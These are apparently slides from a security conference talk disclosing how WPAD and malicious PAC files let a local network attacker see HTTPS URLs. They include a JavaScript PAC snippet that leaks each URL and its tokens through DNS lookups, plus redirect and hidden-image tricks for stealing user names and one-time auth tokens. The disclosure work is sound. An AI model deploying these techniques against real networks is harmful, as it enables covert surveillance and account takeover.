Toxic Proxies - Bypassing HTTPS & VPNs to 
pwn your online identity 
Alex Chapman @noxrnet 
Paul Stone @pdjstone 
Introduction 
Our Talk 
 Exciting introduction 
 Some history – SSL, PAC, WPAD, sslstrip, HSTS 
 The PAC Attack – bypassing HTTPS 
– Sniffing your traffic 
– Stealing your data 
– Stealing your accounts 
 The VPN Attack – bypassing VPNs 
 Mitigations 
 Fixes 
Rogue Access Point Attacks 
 Techniques in this talk assume an attacker on the local 
network, e.g. 
– Open WiFi network 
– Attacker on a corporate network 
– Compromised router 
 Can intercept and modify all non encrypted traffic 
 Can carry out local-network attacks on victims 
First there was no encryption 
 Sure, why not – it’s 1993! 
Then there was SSL 
 Problem: No encryption for sensitive websites 
 Solution: Opt-in encryption, certificates to verify domain 
ownership 
 Netscape 2 ships with SSL in 1995 
 Users somewhat safe from passive  
traffic sniffing attacks 
But SSL wasn’t perfect 
 Many Problems: 
– Most websites allow connecting over HTTP and HTTPS 
– Most people connect over HTTP first, site redirects to HTTPS 
– Evil MITM can prevent user reaching HTTPS site 
 sslstrip released in 2009 - https://moxie.org/software/sslstrip/    
– Man-in-the-middle HTTP proxy 
– Remove redirects to HTTPS 
– Rewrite HTTPS links to HTTP 
– Fetch HTTPS-only pages and serve as HTTP 
– User never actually reaches the real HTTPS site 
But SSL wasn’t perfect 
HSTS to the rescue! 
 Problem: sslstrip broke HTTPS by just ignoring it 
 Solution: force browser to always use HTTPS 
 HTTP-Strict-Transport-Security header – 2010 
– Removes vulnerable HTTP -> HTTPS redirect 
Strict-Transport-Security: max-age=31536000; includeSubDomains 
Present Day 
HSTS is doing a pretty good job 
– Preload lists with most major web sites 
Nearly all traffic to Google, Facebook, Twitter, etc. is HTTPS 
– Google.com went HSTS in July 2016 
So we need a new style attack 
Proxy Auto-Config (PAC) 
 Problem: Complex intranets require different HTTP proxies 
depending on which website you want to visit, e.g.: 
– proxyA.initech.corp for most intranet sites 
– proxyB.initech.corp for access to preprod sites 
– proxyC.initech.corp for public internet access 
 Solution: JavaScript file to tell browser which proxy to use for 
each URL 
 “Navigator Proxy Auto-Config File Format” - March 1996 
– https://web.archive.org/web/20051202115151/http:/ 
wp.netscape.com/eng/mozilla/2.0/relnotes/demo/proxy-
live.html 
Web Proxy Auto-Discovery Protocol (WPAD) 
 Problem: Browser doesn’t work because a proxy is needed on 
network 
 Solution: Browser/OS automatically gets proxy configuration 
from network 
 “Web Proxy Auto-Discovery Protocol” - December 1999 
– https://tools.ietf.org/html/draft-ietf-wrec-wpad-01 
 Router pushes PAC URL via DHCP option 252  
 DNS/ LLMNR / NETBIOS requests for wpad, wpad.internalcorp, 
wpad.corp etc… 
WPAD Attacks 
 WPAD is a huge attack vector 
 https://github.com/SpiderLabs/Responder 
 Malicious network user can respond to WPAD requests, hijack 
traffic 
 All clear-text traffic can be viewed, modified by attacker 
 Can now inject browser 0-days, sslstrip etc.. 
 Some remote WPAD attacks possible 
“Minimally, it can be said that the WPAD protocol does not 
create new security weaknesses.” – WPAD Spec 
Delivering a Malicious PAC File 
DHCP Option 252 with 
malicious URL 
DHCP Discovery 
Delivering a Malicious PAC File 
DNS request for 
wpad.searchdomain 
DNS response with 
malicious host 
Delivering a Malicious PAC File 
LLMNR response with 
malicious host 
LLMNR request  
for “WPAD” 
WPAD Attacks in 2016 
 Windows has WPAD turned on 
by default (even in Home 
editions!) 
 A local network attacker can 
tell the browser to use a 
malicious proxy that can 
sniff/inject traffic 
 Fortunately, HTTPS and HSTS 
means traffic to many popular 
sites is fully encrypted 
 sslstrip is a lot less effective 
than it was 
SRSLY?? 
Rejected  
vulnerability  
name #1: 
Breaking WPAD 
New PAC Attacks 
How does a PAC script work? 
A typical PAC script: 
function FindProxyForURL(url, host) { 
  if (host.indexOf('preprod.initech.corp') >= 0) 
    return 'proxyB.initech.corp'; 
  else if (host.indexOf('initech.corp') >= 0) 
    return 'proxyA.initech.corp'; 
  else  
    return 'proxyC.initech.corp'; 
}  
http://tpsreports.initech.corp  proxyA.initech.corp 
http://dev.preprod.initech.corp  proxyB.initech.corp 
http://www.example.com  proxyC.initech.corp 
PAC - FindProxyForURL 
PAC files must define a function called FindProxyForURL: 
function FindProxyForURL(url, host) { 
  return 'DIRECT'; 
} 
where:  
url: the full URL being accessed.  
host: the hostname extracted from the URL.  
Browser will call: 
FindProxyForURL('https://foo.com/bar?x=y', 'foo.com'); 
PAC - FindProxyForURL 
PAC files must define a function called FindProxyForURL: 
function FindProxyForURL(url, host) { 
  return 'DIRECT'; 
} 
where:  
url: the full URL being accessed.  
host: the hostname extracted from the URL.  
Browser will call: 
FindProxyForURL('https://foo.com/bar?x=y', 'foo.com'); 
PAC Functions 
http://findproxyforurl.com/pac-functions/ 
– alert 
– dateRange 
– dnsDomainIs 
– dnsDomainLevels 
– dnsResolve 
– isInNet 
– isPlainHostName 
– isResolvable 
– localHostOrDomainIs 
– myIpAddress 
– shExpMatch 
– timeRange 
– weekdayRange 
PAC Functions 
http://findproxyforurl.com/pac-functions/ 
– alert 
– dateRange 
– dnsDomainIs 
– dnsDomainLevels  
– dnsResolve 
These are interesting  
– isInNet 
– isPlainHostName 
– isResolvable 
– localHostOrDomainIs 
– myIpAddress 
– shExpMatch 
– timeRange 
– weekdayRange 
PAC - DNS Leak 
Remove / encode special characters in URL to allow leaking over DNS 
  function FindProxyForURL(url, host) { 
    if (url.indexOf('https' == 0) { 
      var leakUrl = (url + '.leak').replace(/[^\w]+/gi, '.'); 
      dnsResolve(leakUrl); 
    } 
    return 'DIRECT'; 
  } 
https://example.com/login?authtoken=ABC123XYZ 
https.example.com.login.authtoken.ABC123XYZ.leak 
PAC – DNS Leaking 
Only a real vuln if it fits in a tweet: 
Malicious Gateway 
1. 
 Attacker can intercept HTTP traffic 
Malicious Gateway vs HTTPS 
1. 
 Attacker cannot intercept HTTPS traffic 
PAC Leak vs HTTPS 
1. 
2. 
3. 
 Attacker can sniff HTTPS URLs 
 Attacker can intercept HTTP traffic 
The PAC attack - summary 
PAC files allow attacker-controlled JavaScript 
to see every HTTPS URL before it gets 
requested by the browser. The PAC file can 
leak data to an attacker via DNS  
HTTPS is meant to protect sensitive data on 
untrusted networks, but WPAD+PAC allows 
an attacker to do an end-run around HTTPS 
Rejected  
vulnerability  
name #2: 
aPACalypse Now 
Passive Browsing demonstration 
Passive Browsing Summary 
 Searching Google, browsing Wikipedia and Facebook all 
happens 100% over HTTPS 
 With the PAC leak we can sniff: 
– Search terms (as you type!) 
– All HTTPS pages visited 
Active Attacks 
Challenge: Steal as much sensitive data as possible using only URLs 
 HTTP and HTTPS URLs, including path and query string 
× HTTP POST bodies 
× Cookies and headers 
× HTTP response bodies 
Limitations breed creativity! 
Web isn’t 100% HTTPS (yet) so we can inject content into  
non-HTTPS pages 
Active Attacks – 302 redirects 
Leak sensitive data via redirects from known to unknown URLs 
– https://plus.google.com/me/posts  
    – 302  https://plus.google.com//posts 
    (or accounts.google.com if not logged in) 
– https://www.reddit.com/user/me  
– 302  https://www.reddit.com/user/  
    (or reddit.com/login if not logged in) 
Inject known URL via hidden image tag: 
https.facebook.com.myuser.name is leaked via DNS 
Active Attacks – Blocking URLs 
Some redirects contain one-time auth tokens 
We want to use these on the ‘attacker’ side 
Must prevent them loading in the victim browser 